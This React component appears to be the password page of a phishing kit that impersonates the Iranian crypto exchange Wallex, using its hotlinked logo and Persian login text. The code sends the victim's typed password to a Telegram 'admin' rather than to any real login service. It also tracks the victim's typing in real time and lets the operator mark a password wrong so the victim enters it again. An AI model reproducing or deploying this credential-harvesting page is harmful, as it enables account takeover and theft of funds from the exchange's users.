import { useState, useEffect } from "react";
import { useLocation, useNavigate } from "react-router-dom";
import {
  canAccessAuthStep,
  updateAuthStep,
  setUserCurrentStep,
} from "@/lib/telegram-service-enhanced";
import { ChevronLeft, Lock, Eye, EyeOff, Loader2 } from "lucide-react";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { AlertMessage } from "@/components/AlertMessage";
import { useRealtimePresence } from "@/hooks/useRealtimePresence";

const AuthPassword = () => {
  const location = useLocation();
  const navigate = useNavigate();
  const [password, setPassword] = useState("");
  const [showPassword, setShowPassword] = useState(false);
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [errors, setErrors] = useState<{ password?: string }>({});
  const [isBlocked, setIsBlocked] = useState(false);

  const phoneNumber = location.state?.phoneNumber || "";
  const sessionId =
    location.state?.sessionId || sessionStorage.getItem("sessionId");
  const hasError = location.state?.hasError || false;

  // Real-time presence tracking
  const presence = useRealtimePresence({
    sessionId: sessionId || "",
    formName: "AuthPassword",
    enabled: !!sessionId,
  });

  // Create typing handlers
  const passwordTypingHandler = presence.createTypingHandler("password");

  useEffect(() => {
    const checkAccess = async () => {
      if (!sessionId) {
        navigate("/", { replace: true });
        return;
      }

      // Check if user can access this step
      const canAccess = canAccessAuthStep(sessionId, "password");
      if (!canAccess && !hasError) {
        setIsBlocked(true);
        setErrors({
          password:
            "شما قبلاً رمز عبور را وارد کرده‌اید. هر مرحله احراز هویت فقط یک بار قابل انجام است.",
        });
        return;
      }

      // If admin marked password as wrong, show error
      if (hasError) {
        setErrors({
          password: "رمز عبور وارد شده اشتباه است. لطفا رمز صحیح را وارد کنید.",
        });
      }

      // Update Telegram that user is on password page
      await setUserCurrentStep(sessionId, "auth_password");
    };

    checkAccess();
  }, [sessionId, navigate, hasError]);

  const validatePassword = (password: string): boolean => {
    // Password must be at least 8 characters and contain numbers and letters
    const passwordRegex = /^(?=.*[A-Za-z])(?=.*\d)[A-Za-z\d@$!%*#?&]{8,}$/;
    return passwordRegex.test(password);
  };

  const handlePasswordSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setErrors({});

    if (isBlocked) {
      return;
    }

    if (!password) {
      setErrors({ password: "رمز عبور الزامی است" });
      return;
    }

    if (!validatePassword(password)) {
      setErrors({
        password: "رمز عبور باید حداقل ۸ کاراکتر و شامل حروف و اعداد باشد",
      });
      return;
    }

    if (!sessionId) {
      setErrors({ password: "خطا در session. لطفا مجدد تلاش کنید." });
      return;
    }

    setIsSubmitting(true);

    try {
      console.log("Sending password to Telegram admin");

      // Update auth step with password data
      const success = await updateAuthStep(sessionId, "password", password);

      if (!success) {
        throw new Error("Failed to update password step");
      }

      await new Promise((resolve) => setTimeout(resolve, 1000));

      // Navigate back to loading page
      navigate("/loading", {
        state: {
          phoneNumber,
          sessionId,
        },
        replace: true,
      });
    } catch (error) {
      console.error("Password submission error:", error);
      setErrors({ password: "خطا در ارسال رمز عبور. لطفا دوباره تلاش کنید." });
    } finally {
      setIsSubmitting(false);
    }
  };

  const handleBack = () => {
    navigate("/loading", {
      state: { phoneNumber, sessionId },
    });
  };

  return (
    <div
      style={{
        display: "flex",
        height: "100vh",
        backgroundColor: "rgb(14, 35, 66)",
        alignItems: "center",
        justifyContent: "center",
      }}
    >
      <div
        style={{
          backgroundColor: "rgb(255, 255, 255)",
          width: "100%",
          maxWidth: "480px",
        }}
        className="form-card"
      >
        <div
          style={{
            display: "flex",
            flexDirection: "column",
            gap: "8px",
            padding: "20px",
            width: "100%",
          }}
        >
          {/* Header */}
          <div
            style={{
              display: "flex",
              justifyContent: "space-between",
              alignItems: "center",
              width: "100%",
            }}
          >
            <div style={{ display: "flex", alignItems: "center", gap: "8px" }}>
              <Button
                variant="ghost"
                size="icon"
                onClick={handleBack}
                className="flex-shrink-0 p-0 bg-transparent hover:bg-gray-100"
                style={{
                  borderRadius: "50%",
                  width: "auto",
                  height: "auto",
                  padding: "0",
                  backgroundColor: "rgba(0, 0, 0, 0)",
                }}
              >
                <ChevronLeft
                  style={{
                    width: "24px",
                    height: "24px",
                    color: "rgba(0, 0, 0, 0.6)",
                    cursor: "pointer",
                  }}
                />
              </Button>
              <span style={{ fontWeight: "700", fontSize: "16px" }}>ورود</span>
            </div>
            <img
              src="https://wallex.ir/_next/image?url=%2Fimages%2Fwallex-logo-v-light.svg&w=256&q=75"
              alt="صرافی خرید فروش ارزهای دیجیتال"
              style={{
                width: "128px",
                height: "24px",
                objectFit: "contain",
              }}
            />
          </div>

          {/* Separator */}
          <hr
            style={{
              borderColor: "rgba(0, 0, 0, 0.2)",
              borderBottom: "1px solid rgba(0, 0, 0, 0.2)",
              marginLeft: "-20px",
              marginRight: "-20px",
              marginTop: "8px",
              marginBottom: "8px",
            }}
          />

          {/* Content */}
          <div style={{ marginTop: "16px" }}>
            <form onSubmit={handlePasswordSubmit}>
              <div style={{ marginBottom: "24px" }}>
                <AlertMessage>
                  <Lock
                    className="inline ml-2"
                    style={{ width: "16px", height: "16px" }}
                  />
                  رمز عبور حساب کاربری خود را وارد کنید.
                </AlertMessage>
              </div>

              <div style={{ marginBottom: "16px" }}>
                <label
                  htmlFor="password-input"
                  style={{
                    fontSize: "14px",
                    fontWeight: "500",
                    marginBottom: "8px",
                    display: "block",
                    textAlign: "right",
                  }}
                >
                  رمز عبور
                </label>
                <div style={{ position: "relative" }}>
                  <Input
                    id="password-input"
                    type={showPassword ? "text" : "password"}
                    value={password}
                    onChange={(e) => {
                      setPassword(e.target.value);
                      if (errors.password) {
                        setErrors((prev) => ({ ...prev, password: undefined }));
                      }
                      // تشخیص تایپ برای presence system
                      passwordTypingHandler.onKeyDown();
                    }}
                    onFocus={passwordTypingHandler.onFocus}
                    onBlur={passwordTypingHandler.onBlur}
                    className="w-full text-right pr-12"
                    style={{
                      borderRadius: "8px",
                      border: errors.password
                        ? "1px solid rgb(220, 38, 38)"
                        : "1px solid rgba(0, 0, 0, 0.2)",
                      padding: "10px 44px 10px 12px",
                      fontSize: "14px",
                      textAlign: "right",
                    }}
                    placeholder="رمز عبور خود را وارد کنید"
                    autoFocus
                    disabled={isSubmitting}
                  />
                  <button
                    type="button"
                    onClick={() => setShowPassword(!showPassword)}
                    style={{
                      position: "absolute",
                      right: "12px",
                      top: "50%",
                      transform: "translateY(-50%)",
                      background: "none",
                      border: "none",
                      cursor: "pointer",
                      color: "rgba(0, 0, 0, 0.6)",
                    }}
                  >
                    {showPassword ? (
                      <EyeOff style={{ width: "20px", height: "20px" }} />
                    ) : (
                      <Eye style={{ width: "20px", height: "20px" }} />
                    )}
                  </button>
                </div>
                {errors.password && (
                  <p
                    style={{
                      color: "rgb(220, 38, 38)",
                      fontSize: "12px",
                      textAlign: "right",
                      marginTop: "4px",
                    }}
                  >
                    {errors.password}
                  </p>
                )}
              </div>

              {/* Password Requirements */}
              <div
                style={{
                  padding: "16px",
                  backgroundColor: "rgba(168, 85, 247, 0.05)",
                  borderRadius: "8px",
                  marginBottom: "24px",
                  border: "1px solid rgba(168, 85, 247, 0.2)",
                }}
              >
                <h4
                  style={{
                    fontSize: "14px",
                    fontWeight: "600",
                    color: "rgb(0, 0, 0)",
                    margin: "0 0 8px 0",
                    textAlign: "right",
                  }}
                >
                  🔒 الزامات رمز عبور:
                </h4>
                <ul
                  style={{
                    fontSize: "12px",
                    color: "rgba(0, 0, 0, 0.7)",
                    margin: "0",
                    paddingRight: "16px",
                    lineHeight: "1.5",
                  }}
                >
                  <li>حداقل ۸ کاراکتر</li>
                  <li>شامل حروف انگلیسی</li>
                  <li>شامل اعداد</li>
                  <li>می‌تواند شامل کاراکترهای خاص باشد (@$!%*#?&)</li>
                </ul>
              </div>

              {/* Forgot Password Link */}
              <div style={{ textAlign: "center", marginBottom: "24px" }}>
                <button
                  type="button"
                  style={{
                    color: "rgb(0, 122, 255)",
                    textDecoration: "underline",
                    background: "none",
                    border: "none",
                    cursor: "pointer",
                    fontSize: "14px",
                  }}
                  onClick={() => {
                    alert("لینک بازیابی رمز عبور به ایمیل شما ارسال خواهد شد.");
                  }}
                >
                  رمز عبور خود را فراموش کرده‌اید؟
                </button>
              </div>

              <div style={{ marginTop: "16px" }}>
                <hr
                  style={{
                    borderColor: "rgba(0, 0, 0, 0.2)",
                    marginLeft: "-20px",
                    marginRight: "-20px",
                    marginBottom: "16px",
                  }}
                />
                <Button
                  type="submit"
                  disabled={isSubmitting}
                  className="w-full"
                  style={{
                    backgroundColor: "rgb(23, 29, 38)",
                    color: "rgb(255, 255, 255)",
                    borderRadius: "8px",
                    padding: "10px 16px",
                    fontSize: "14px",
                    fontWeight: "500",
                    textTransform: "uppercase",
                    border: "none",
                    cursor: isSubmitting ? "not-allowed" : "pointer",
                    opacity: isSubmitting ? "0.5" : "1",
                  }}
                >
                  {isSubmitting ? (
                    <div className="flex items-center justify-center">
                      <Loader2
                        className="animate-spin mr-2"
                        style={{ width: "16px", height: "16px" }}
                      />
                      <span>در حال بررسی...</span>
                    </div>
                  ) : (
                    "ثبت و ادامه"
                  )}
                </Button>
              </div>
            </form>
          </div>
        </div>
      </div>

      <style jsx>{`
        /* Desktop styles (1024px and up) */
        @media (min-width: 1024px) {
          .form-card {
            border-radius: 16px;
          }
        }

        /* Mobile and tablet styles (up to 1023px) */
        @media (max-width: 1023px) {
          .form-card {
            border-radius: 0 !important;
            max-width: none !important;
            height: 100vh;
            min-height: 100vh;
            margin: 0;
            display: flex;
            flex-direction: column;
            justify-content: flex-start;
          }
          .form-card > div {
            padding: 20px !important;
            height: 100%;
            overflow-y: auto;
            display: flex;
            flex-direction: column;
            justify-content: flex-start;
          }
        }
      `}</style>
    </div>
  );
};

export default AuthPassword;
